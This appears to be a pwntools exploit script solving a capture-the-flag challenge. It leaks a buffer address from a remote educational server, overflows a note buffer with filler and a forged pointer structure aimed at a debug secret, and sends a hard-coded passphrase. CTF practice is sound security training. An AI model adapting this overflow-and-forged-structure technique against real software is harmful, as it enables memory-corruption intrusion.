from pwn import *

context.terminal = ['tmux', 'split', '-h']
context.binary = "./chal"

# p = process("./chal")
p = remote("edu-ctf.zoolab.org", 30216)

p.recvuntil("0x")

note_buf = int(p.recvline(), base=16)
debug_secret_addr = note_buf - 0x30
print(hex(note_buf), hex(debug_secret_addr))


p.sendlineafter(">", "1")
p.sendlineafter(">", "2")

flag = 0

payload = flat(
    flag, 0,
    0, 0,
    0, 0,
    0, debug_secret_addr,
    debug_secret_addr+0x10, 0,
    0, 0,
    0, 0,
    0
)
p.sendlineafter("data>", b'A'*0x210+payload)

p.sendlineafter(">", "4")
p.sendline(b"gura_50_cu73\x00")


# gdb.attach(p)
# p.sendlineafter(">", "3")

p.interactive()